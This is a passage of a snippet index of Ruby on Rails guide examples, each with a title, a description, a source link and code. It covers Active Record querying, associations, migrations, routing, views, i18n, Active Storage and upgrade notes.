\"admin\"\n```\n\n----------------------------------------\n\nTITLE: Checking for Anonymous Modules in Ruby\nDESCRIPTION: This example shows how to check if a module is anonymous using the `anonymous?` predicate.  An anonymous module is one that doesn't have a name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nmodule M\nend\nM.name # => \"M\"\n\nN = Module.new\nN.name # => \"N\"\n\nModule.new.name # => nil\n```\n\nLANGUAGE: ruby\nCODE:\n```\nmodule M\nend\nM.anonymous? # => false\n\nModule.new.anonymous? # => true\n```\n\nLANGUAGE: ruby\nCODE:\n```\nmodule M\nend\n\nm = Object.send(:remove_const, :M)\n\nm.anonymous? # => false\n```\n\n----------------------------------------\n\nTITLE: Specifying a Local Engine Dependency (Ruby)\nDESCRIPTION: Demonstrates how to specify a dependency on a local engine ('blorgh') in the host application's `Gemfile` using the `:path` option. This points Bundler to the engine's directory on the local filesystem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"blorgh\", path: \"engines/blorgh\"\n```\n\n----------------------------------------\n\nTITLE: Example Users Helper - Ruby\nDESCRIPTION: This Ruby module defines a helper method `link_to_user` that generates a link to a user's profile using their full name. It leverages Rails' `link_to` helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_92\n\nLANGUAGE: ruby\nCODE:\n```\nmodule UsersHelper\n  def link_to_user(user)\n    link_to \"#{user.first_name} #{user.last_name}\", user\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for OR Condition in Rails\nDESCRIPTION: This is the SQL output of the `OR` example. It showcases how the `OR` condition is translated into SQL, combining the two `WHERE` clauses with an `OR` operator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_74\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.last_name = 'Smith' OR customers.orders_count IN (1,3,5))\n```\n\n----------------------------------------\n\nTITLE: Live Streaming Data in Rails Controller\nDESCRIPTION: Demonstrates live streaming of arbitrary data using ActionController::Live module. Shows how to maintain a persistent connection and stream data periodically.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyController < ActionController::Base\n  include ActionController::Live\n\n  def stream\n    response.headers[\"Content-Type\"] = \"text/event-stream\"\n    100.times {\n      response.stream.write \"hello world\\n\"\n      sleep 1\n    }\n  ensure\n    response.stream.close\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Inventory Migration (Rails)\nDESCRIPTION: This command generates a Rails migration to add an integer column named `inventory_count` to the `products` table. It is executed using the `rails generate migration` command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_94\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration AddInventoryCountToProducts inventory_count:integer\n```\n\n----------------------------------------\n\nTITLE: Using inspect Helper in Rails Views\nDESCRIPTION: Demonstrates the inspect method for displaying object values as strings, which is particularly useful when working with arrays or hashes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_2\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= [1, 2, 3, 4, 5].inspect %>\n<p>\n  <b>Title:</b>\n  <%= @article.title %>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Creating & Persisting Account via create_account - Ruby\nDESCRIPTION: Creates and saves a new Account for a Supplier, after running Account model validations. Returns the Account object if saved, otherwise returns an unsaved object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\n@account = @supplier.create_account(terms: \\\"Net 30\\\")\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Pipeline in Rails 3.1\nDESCRIPTION: This snippet shows how to enable and configure the asset pipeline in the application.rb file for Rails 3.1. It includes options to set the asset version and prefix.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.assets.enabled = true\nconfig.assets.version = \"1.0\"\n\n# Defaults to '/assets'\nconfig.assets.prefix = \"/asset-files\"\n```\n\n----------------------------------------\n\nTITLE: Partial Layout\nDESCRIPTION: Illustrates a simple partial layout that wraps the rendered content in a `div` with the class `box`.  It uses `<%= yield %>` to inject the content from the partial being rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_44\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/articles/_box.html.erb %>\n<div class=\"box\">\n  <%= yield %>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Preloading ActionText::RichText Model\nDESCRIPTION: This snippet shows how to preload the dependent `ActionText::RichText` model and its attachments using named scopes to avoid N+1 queries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nArticle.all.with_rich_text_content # Preload the body without attachments.\nArticle.all.with_rich_text_content_and_embeds # Preload both body and attachments.\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies on Arch Linux\nDESCRIPTION: Commands to install all required dependencies and start services on Arch Linux, using MariaDB instead of MySQL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo pacman -S sqlite mariadb libmariadbclient mariadb-clients postgresql postgresql-libs redis memcached imagemagick ffmpeg mupdf mupdf-tools poppler yarn libxml2 libvips poppler\n$ sudo mariadb-install-db --user=mysql --basedir=/usr --datadir=/var/lib/mysql\n$ sudo systemctl start redis mariadb memcached\n```\n\n----------------------------------------\n\nTITLE: Running Engine Migrations (Bash)\nDESCRIPTION: Executes the database migrations specific to the Rails engine. This command applies pending migrations found in the engine's 'db/migrate' directory, such as the one created for the 'blorgh_comments' table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Previewing Non-Image Files with Active Storage\nDESCRIPTION: Demonstrates how to generate and display a preview of a non-image file, such as a video. This example creates a 100x100 preview of a video file attachment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_59\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag message.video.preview(resize_to_limit: [100, 100]) %>\n```\n\n----------------------------------------\n\nTITLE: Accessing Custom Logger in Rails 7.1\nDESCRIPTION: Example showing how to access a custom logger instance in Rails 7.1 using the new broadcasts method on the BroadcastLogger that now wraps the configured logger instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nconfig.logger = MyLogger.new\n\n# Anywhere in your application\nputs Rails.logger.class #=> BroadcastLogger\nputs Rails.logger.broadcasts #=> [MyLogger]\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial (ERB)\nDESCRIPTION: This ERB code demonstrates how to render a partial template within a view. It uses the `render` method to include the contents of the `_product.html.erb` file. The underscore is omitted when rendering the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_10\n\nLANGUAGE: ERB\nCODE:\n```\n<%= render \"product\" %>\n```\n\n----------------------------------------\n\nTITLE: Posting Forms to External Resources in Rails (ERB)\nDESCRIPTION: This snippet shows how to build a form to post data to an external resource using `form_with`. It includes setting a custom `authenticity_token`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_87\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: 'http://farfar.away/form', authenticity_token: 'external_token' do %>\n  Form contents\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Implementing Email Observer in Ruby on Rails\nDESCRIPTION: This code defines an email observer class that logs details of delivered emails. It demonstrates how to create a callback that runs after an email is sent.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nclass EmailDeliveryObserver\n  def self.delivered_email(message)\n    EmailDelivery.log(message)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Documentation Wording - Tense Usage\nDESCRIPTION: Shows the correct usage of present tense in documentation compared to incorrect alternatives. The example emphasizes using consistent present tense for describing method behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# Returned a hash that...\n# Will return a hash that...\n# Return a hash that...\n\n# GOOD\n# Returns a hash that...\n```\n\n----------------------------------------\n\nTITLE: Using Scopes with ActiveRecord Associations\nDESCRIPTION: Shows how to define a scope on an association to filter records. This example only includes active assemblies in the association, filtering at the database level.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_116\n\nLANGUAGE: ruby\nCODE:\n```\nclass Parts < ApplicationRecord\n  has_and_belongs_to_many :assemblies, -> { where active: true }\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring PostgreSQL Database for JRuby (YAML)\nDESCRIPTION: This YAML snippet configures a PostgreSQL database for the development environment using JRuby. It specifies the `jdbcpostgresql` adapter, encoding, database name, username, and password.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_95\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: jdbcpostgresql\n  encoding: unicode\n  database: blog_development\n  username: blog\n  password:\n```\n\n----------------------------------------\n\nTITLE: Rendering Collection Shorthand\nDESCRIPTION: This code snippet shows the shorthand for rendering a collection of partials. Assuming `@products` is a collection of `Product` instances, this will render the `_product.html.erb` partial for each product in the collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_86\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Products</h1>\n<%= render @products %>\n```\n\n----------------------------------------\n\nTITLE: Defining a Route with Bound Parameters - Ruby\nDESCRIPTION: This snippet defines a route that maps `/photos(/:id)` to the `display` action of the `PhotosController`. The `:id` parameter is optional and will be available in `params[:id]`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos(/:id)\", to: \"photos#display\"\n```\n\n----------------------------------------\n\nTITLE: Blocking Search Engine Indexing with robots.txt\nDESCRIPTION: This snippet shows how to block all search engine indexing on an entire site using the `robots.txt` file. This prevents search engines from indexing any pages on the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_119\n\nLANGUAGE: text\nCODE:\n```\nUser-agent: *\nDisallow: /\n```\n\n----------------------------------------\n\nTITLE: Internationalized Home View Template\nDESCRIPTION: The updated HTML template that uses the Rails translation helper (t) to abstract the heading text into a translation key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_17\n\nLANGUAGE: html+erb\nCODE:\n```\n<!-- app/views/home/index.html.erb -->\n<h1><%= t :hello_world %></h1>\n<p><%= flash[:notice] %></p>\n```\n\n----------------------------------------\n\nTITLE: Generating a Blank Migration (Bash)\nDESCRIPTION: This command generates an empty migration file named with a timestamp followed by 'AddPartNumberToProducts'. The resulting Ruby class 'AddPartNumberToProducts' inherits from ActiveRecord::Migration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration AddPartNumberToProducts\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Methods to Rails Associations with Extensions\nDESCRIPTION: Implementation of inline association extensions to add custom finder methods to an association. This allows for more domain-specific queries directly on the association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_141\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books do\n    def find_by_book_prefix(book_number)\n      find_by(category_id: book_number[0..2])\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Checking Multiples of Integers in Ruby\nDESCRIPTION: This snippet shows how to use the `multiple_of?` method to test if an integer is a multiple of another integer. This is an ActiveSupport core extension to the Integer class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_105\n\nLANGUAGE: ruby\nCODE:\n```\n2.multiple_of?(1) # => true\n1.multiple_of?(2) # => false\n```\n\n----------------------------------------\n\nTITLE: Changing a Column Null Constraint\nDESCRIPTION: This code snippet demonstrates how to change the null constraint of a column using the `change_column_null` method.  The `:name` field in the `products` table is set to `NOT NULL`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nchange_column_null :products, :name, false\n```\n\n----------------------------------------\n\nTITLE: Configuring Non-Reloadable Code in Rails Initializers\nDESCRIPTION: This snippet demonstrates how to handle non-reloadable code in Rails initializers, such as configuring middleware or custom serializers that should remain cached.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"middleware/my_middleware\"\nconfig.middleware.use MyMiddleware\n\n# config/initializers/custom_serializers.rb\nRails.application.config.active_job.custom_serializers << MoneySerializer\n```\n\n----------------------------------------\n\nTITLE: Reloading a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the reload method to force a database read of all assemblies associated with a part, returning a fresh Relation of objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\n@assemblies = @part.assemblies.reload\n```\n\n----------------------------------------\n\nTITLE: Home View with Date/Time Localization\nDESCRIPTION: Updated home view template that includes timestamp localization using the Rails localization helper (l) with a format option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_28\n\nLANGUAGE: html+erb\nCODE:\n```\n<!-- app/views/home/index.html.erb -->\n<h1><%= t :hello_world %></h1>\n<p><%= flash[:notice] %></p>\n<p><%= l Time.now, format: :short %></p>\n```\n\n----------------------------------------\n\nTITLE: Configuring Postfix Ingress in Rails\nDESCRIPTION: This Ruby code configures Action Mailbox to accept emails from an SMTP relay using the Postfix ingress. This needs to be placed within the application's production environment configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_5\n\nLANGUAGE: Ruby\nCODE:\n```\n# config/environments/production.rb\nconfig.action_mailbox.ingress = :relay\n```\n\n----------------------------------------\n\nTITLE: Example of Correct Rails Component Naming in Documentation\nDESCRIPTION: Demonstrates how to properly refer to Rails components by their proper names, distinguishing between code modules like ActiveRecord and concepts like Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# GOOD\n# Active Record classes can be created by inheriting from\n# ActiveRecord::Base.\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Merging with Unscoped Relation (SQL)\nDESCRIPTION: This SQL query is the result of merging a relation with an unscoped relation. The `order` clause has been removed due to the `unscope` method being applied in the merged relation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_105\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n```\n\n----------------------------------------\n\nTITLE: Adding Counter Cache to Rails ActiveRecord Associations\nDESCRIPTION: Implementation of counter cache optimization for the Book-Author relationship. This reduces database queries by caching the count of associated records in the parent model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_137\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, counter_cache: true\nend\n\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching with Variable Renaming in Ruby\nDESCRIPTION: This example shows how to use pattern matching with variable renaming.  The `product` key in local_assigns is assigned to a new variable `record`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nlocal_assigns => { product: record }\nproduct             # => \"#<Product:0x0000000109ec5d10>\"\nrecord              # => \"#<Product:0x0000000109ec5d10>\"\nproduct == record   # => true\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails Application with YAML in Ruby\nDESCRIPTION: This example demonstrates how to use config_for to load YAML configuration in a Rails application, and how to handle the changes in key access between Rails 6.0 and 6.1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\n# config/example.yml\ndevelopment:\n  options:\n    key: value\n```\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config_for(:example).with_indifferent_access.dig(\"options\", \"key\")\n```\n\n----------------------------------------\n\nTITLE: Root Route within Namespaces in Rails\nDESCRIPTION: This example demonstrates defining root routes within namespaces in Rails. The first root route maps `/` to the `HomeController`, while the root route inside the `admin` namespace maps `/admin` to the `AdminController`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nroot to: \"home#index\"\n\nnamespace :admin do\n  root to: \"admin#index\"\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Controller in Rails\nDESCRIPTION: This bash command generates a `ProductsController` with an `index` action, skipping the route generation. The `--skip-routes` flag prevents the generator from modifying the `routes.rb` file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_41\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate controller Products index --skip-routes\n```\n\n----------------------------------------\n\nTITLE: Declaring Has and Belongs to Many Association in a Rails Model\nDESCRIPTION: Example declaration of a has_and_belongs_to_many association in a Part model, which provides numerous methods for interacting with the associated assemblies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nclass Part < ApplicationRecord\n  has_and_belongs_to_many :assemblies\nend\n```\n\n----------------------------------------\n\nTITLE: Disabling Error Notifications in Ruby on Rails\nDESCRIPTION: Demonstrates how to temporarily disable error notifications for a specific subscriber using Rails.error.disable. This can be useful for managing error handling at different levels of the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.disable(ErrorSubscriber) do\n  1 + \"1\" # TypeError will not be reported via the ErrorSubscriber\nend\n```\n\n----------------------------------------\n\nTITLE: Passing Multiple Validators and Options with validates_with in Rails\nDESCRIPTION: This example shows how to apply multiple validator classes to a model and how to specify validation contexts using the on option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates_with MyValidator, MyOtherValidator, on: :create\nend\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Time Range in Rails\nDESCRIPTION: This is the SQL generated by the Ruby code. It demonstrates the use of the `BETWEEN` operator in SQL to filter records based on a date range.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_65\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE (books.created_at BETWEEN '2008-12-21 00:00:00' AND '2008-12-22 00:00:00')\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Scope in Rails\nDESCRIPTION: Demonstrates defining a simple scope using the `scope` method in an Active Record model. Scopes encapsulate common queries and can be chained with other scopes or query methods.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_161\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  scope :out_of_print, -> { where(out_of_print: true) }\nend\n```\n\n----------------------------------------\n\nTITLE: Spanish Locale File with Products Index Title - YAML\nDESCRIPTION: This YAML snippet shows an example of a Spanish locale file (es.yml) with a translation for the \"products.index.title\" key, which is used in the products index view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_93\n\nLANGUAGE: yaml\nCODE:\n```\nes:\n  hello: \"Hola mundo\"\n  products:\n    index:\n      title: \"Productos\"\n```\n\n----------------------------------------\n\nTITLE: Installing Action Text in Rails\nDESCRIPTION: This bash command installs the necessary JavaScript packages, adds the image_processing gem, creates migrations for rich text and attachments, creates a CSS file, and adds default view partials.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails action_text:install\n```\n\n----------------------------------------\n\nTITLE: Generated SQL for Subset Condition in Rails\nDESCRIPTION: This SQL query generated by the array-based condition showcases the `IN` operator, effectively filtering results where `orders_count` matches any value in the specified array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_69\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.orders_count IN (1,3,5))\n```\n\n----------------------------------------\n\nTITLE: Updating Active Storage Crop Syntax for VIPS - Diff\nDESCRIPTION: Demonstrates how to update the crop parameter syntax when migrating from ImageMagick to VIPS for Active Storage variant processing in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_21\n\nLANGUAGE: diff\nCODE:\n```\n- variant(crop: \"1920x1080+0+0\")\n+ variant(crop: [0, 0, 1920, 1080])\n```\n\n----------------------------------------\n\nTITLE: Implementing ActiveJob callbacks with a block\nDESCRIPTION: This snippet shows how to implement a `before_enqueue` callback using a block.  This example sends metrics for every job enqueued.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationJob < ActiveJob::Base\n  before_enqueue { |job| $statsd.increment \"#{job.class.name.underscore}.enqueue\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Reversing Order without Initial Order Clause (Ruby)\nDESCRIPTION: This snippet demonstrates the `reverse_order` method when no initial ordering clause is specified.  It will then order by the primary key in reverse order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_119\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"author_id > 10\").reverse_order\n```\n\n----------------------------------------\n\nTITLE: Camelize String with Namespaces\nDESCRIPTION: This snippet demonstrates how the `camelize` method transforms paths into Ruby class or module names, where slashes separate namespaces.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\n\"backoffice/session\".camelize # => \"Backoffice::Session\"\n```\n\n----------------------------------------\n\nTITLE: Compacting Hashes to Remove Nil Values - Ruby\nDESCRIPTION: The `Hash#compact` and `Hash#compact!` methods remove key-value pairs where the value is nil, returning a new hash or modifying in-place respectively. These methods are useful for cleaning up options or parameters before further processing. Requires ActiveSupport or Ruby 2.4+. Input is any Hash; output is a hash with all nil values removed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_16\n\nLANGUAGE: Ruby\nCODE:\n```\n{a: 1, b: nil}.compact # => {:a=>1}\n```\n\n----------------------------------------\n\nTITLE: Adjusting Background Color for resize_and_pad in Ruby on Rails\nDESCRIPTION: This snippet shows how to modify the background color used for the resize_and_pad operation when migrating from ImageMagick to Vips in Rails Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_22\n\nLANGUAGE: diff\nCODE:\n```\n- variant(resize_and_pad: [300, 300])\n+ variant(resize_and_pad: [300, 300, background: [255]])\n```\n\n----------------------------------------\n\nTITLE: CSS Asset URL References\nDESCRIPTION: Examples of referencing assets in CSS and how Propshaft transforms the URLs to use fingerprinted versions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_7\n\nLANGUAGE: css\nCODE:\n```\nbackground: url(\"/bg/pattern.svg\");\n```\n\nLANGUAGE: css\nCODE:\n```\nbackground: url(\"/assets/bg/pattern-2169cbef.svg\");\n```\n\nLANGUAGE: css\nCODE:\n```\n/* app/assets/stylesheets/main.css */\nbody {\n  background-color: red;\n}\n```\n\n----------------------------------------\n\nTITLE: Testing File Uploads in Rails Integration Tests\nDESCRIPTION: This Ruby code snippet demonstrates how to test file uploads in a Rails integration test using the file_fixture_upload helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\nclass SignupController < ActionDispatch::IntegrationTest\n  test \"can sign up\" do\n    post signup_path, params: {\n      name: \"David\",\n      avatar: file_fixture_upload(\"david.png\", \"image/png\")\n    }\n\n    user = User.order(:created_at).last\n    assert user.avatar.attached?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Loading YAML Configuration in Rails Application\nDESCRIPTION: This Ruby snippet demonstrates how to load a YAML configuration file (e.g., `config/payment.yml`) using `Rails::Application.config_for` within a Rails application class.  The configuration is assigned to `config.payment`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule MyApp\n  class Application < Rails::Application\n    config.payment = config_for(:payment)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Parallel Testing with Threads\nDESCRIPTION: This code shows how to switch to threaded parallelization in `test_helper.rb`. It utilizes minitest's `Parallel::Executor` and is automatically included for JRuby or TruffleRuby.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_114\n\nLANGUAGE: ruby\nCODE:\n```\nclass ActiveSupport::TestCase\n  parallelize(workers: :number_of_processors, with: :threads)\nend\n```\n\n----------------------------------------\n\nTITLE: Storing Ingress Password in Credentials\nDESCRIPTION: This YAML code demonstrates storing the ingress password in the Rails encrypted credentials file for use with Exim, Postfix, and Qmail. Action Mailbox reads this credential to authenticate requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_13\n\nLANGUAGE: YAML\nCODE:\n```\naction_mailbox:\n  ingress_password: ...\n```\n\n----------------------------------------\n\nTITLE: Cache Response Forever\nDESCRIPTION: This snippet demonstrates how to cache a response indefinitely using the `http_cache_forever` helper. Setting `public: true` allows proxies to cache the response for all users.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nclass HomeController < ApplicationController\n  def index\n    http_cache_forever(public: true) do\n      render\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the priority using set option\nDESCRIPTION: This snippet demonstrates setting the priority of a job using the `:priority` option with the `set` method when enqueuing. It allows for specifying the job's priority at the time of enqueuing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nMyJob.set(priority: 50).perform_later(record)\n```\n\n----------------------------------------\n\nTITLE: Using Validator Introspection in Rails 3\nDESCRIPTION: Example showing how to introspect validators in Rails 3. The first method returns all validators defined on a model, while the second returns validators for a specific attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nUser.validators\nUser.validators_on(:login)\n```\n\n----------------------------------------\n\nTITLE: Defining scopes in Rails 3 Active Record\nDESCRIPTION: Example showing the new preferred syntax for defining scopes in Rails 3 which uses the relation methods instead of the deprecated conditions hash syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nscope :since, lambda {|time| where(\"created_at > ?\", time) }\n```\n\n----------------------------------------\n\nTITLE: Rails Params Hash Example (Array)\nDESCRIPTION: Demonstrates how multiple inputs with the same name ending in '[]' are captured as an array within the params hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\n{ \"person\" => { \"phone_number\" => [\"555-0123\", \"555-0124\", \"555-0125\"] } }\n```\n\n----------------------------------------\n\nTITLE: Tagged Logging Implementation\nDESCRIPTION: Shows how to use ActiveSupport::TaggedLogging for adding tags to log messages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nLogger = ActiveSupport::TaggedLogging.new(Logger.new(STDOUT))\n\nLogger.tagged(\"BCX\") { Logger.info \"Stuff\" }\n# Logs \"[BCX] Stuff\"\n\nLogger.tagged(\"BCX\", \"Jason\") { Logger.info \"Stuff\" }\n# Logs \"[BCX] [Jason] Stuff\"\n\nLogger.tagged(\"BCX\") { Logger.tagged(\"Jason\") { Logger.info \"Stuff\" } }\n# Logs \"[BCX] [Jason] Stuff\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Test Environment for Rails 3.1\nDESCRIPTION: Static asset server configuration for the test environment in Rails 3.1, including cache control settings for improved performance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: 